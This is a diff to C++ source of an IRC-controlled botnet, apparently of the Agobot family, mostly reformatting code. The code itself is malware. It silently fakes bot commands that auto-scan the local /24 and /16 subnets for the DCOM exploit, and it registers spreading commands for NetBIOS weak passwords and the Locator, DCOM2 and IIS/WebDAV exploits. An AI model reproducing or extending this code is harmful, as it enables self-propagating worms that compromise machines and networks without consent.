@@ -12,14 +12,21 @@ void CScannerAuto::Init()
 {
 #ifndef _DEBUG
 	if(g_cMainCtrl.m_cBot.scan_auto.bValue)
-	{	char szLocalIp[32]={0}; char szName[255]={0}; unsigned long lLocalIp;
-		CMessage mFakeMsg; int i=0; hostent *hEnt;
+	{	
+		char szLocalIp[32]={0}; 
+		char szName[255]={0};
+		unsigned long lLocalIp;
+		CMessage mFakeMsg; 
+		int i=0; 
+		hostent *hEnt;
 
-		gethostname(szName, sizeof(szName)); hEnt=gethostbyname(szName);
+		gethostname(szName, sizeof(szName)); 
+		hEnt=gethostbyname(szName);
 		memcpy(&lLocalIp, hEnt->h_addr_list[0], hEnt->h_length);
 		strcpy(szLocalIp, inet_ntoa(to_in_addr(lLocalIp)));
 
-		mFakeMsg.bNotice=false; mFakeMsg.bSilent=true;
+		mFakeMsg.bNotice=false; 
+		mFakeMsg.bSilent=true;
 		mFakeMsg.sChatString.Format(".scan.dcom %s/24 1000000", szLocalIp);
 		mFakeMsg.sCmd.Assign("scan.dcom");
 		mFakeMsg.sDest.Assign(g_cMainCtrl.m_cBot.si_mainchan.sValue);
@@ -28,13 +35,14 @@ void CScannerAuto::Init()
 		mFakeMsg.sReplyTo.Assign(g_cMainCtrl.m_cBot.si_mainchan.sValue);
 		mFakeMsg.sSrc.Assign("AutoScanner");
 #ifdef DBGCONSOLE
-                    g_cMainCtrl.m_cConsDbg.Log(1, "CIRC(0x%8.8Xh): %s / %s / %s / %s / \"%s\"...\n", \
-                        this, mFakeMsg->sSrc.CStr(), mFakeMsg->sIdentd.CStr(), mFakeMsg->sHost.CStr(), \
+                    g_cMainCtrl.m_cConsDbg.Log(1, "CIRC(0x%8.8Xh): %s / %s / %s / %s / \"%s\"...\n", this, mFakeMsg->sSrc.CStr(), mFakeMsg->sIdentd.CStr(), mFakeMsg->sHost.CStr(), \
                         mFakeMsg->sDest.CStr(), mFakeMsg->sChatString.CStr());
 #endif
-		for(i=0;i<15;i++) g_cMainCtrl.m_cScanner.HandleCommand(&mFakeMsg);
+		for(i=0;i<15;i++)
+			g_cMainCtrl.m_cScanner.HandleCommand(&mFakeMsg);
 		mFakeMsg.sChatString.Format(".scan.dcom %s/16 10000000", szLocalIp);
-		for(i=0;i<25;i++) g_cMainCtrl.m_cScanner.HandleCommand(&mFakeMsg); }
+		for(i=0;i<25;i++)
+				g_cMainCtrl.m_cScanner.HandleCommand(&mFakeMsg); }
 #define SCANTEST
 #ifdef SCANTEST
 	CMessage mFakeMsg;
@@ -58,7 +66,8 @@ void CScannerAuto::Init()
 }
 
 void CScanner::Init()
-{	m_iNumThreads=0; m_bScanning=false;
+{	
+	m_iNumThreads=0; m_bScanning=false;
 #ifdef WIN32
 	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdNetBios,	"scan.netbios",	"scans weak netbios passwords",	this);
 	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdLocator,	"scan.locator",	"scans for locator exploit",	this);
@@ -66,7 +75,8 @@ void CScanner::Init()
 	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdDCOM,		"scan.dcom",	"scans for dcom exploit",		this);
 	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdDCOM2,	"scan.dcom2",	"scans for dcom2 exploit",		this);
 	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdWebDav,	"scan.webdav",	"scans for iis/webdav exploit",	this);
-	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdStop,		"scan.stop",	"stops all scans running asap",	this); }
+	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdStop,		"scan.stop",	"stops all scans running asap",	this);
+}
 
 bool CScanner::HandleCommand(CMessage *pMsg)
 {
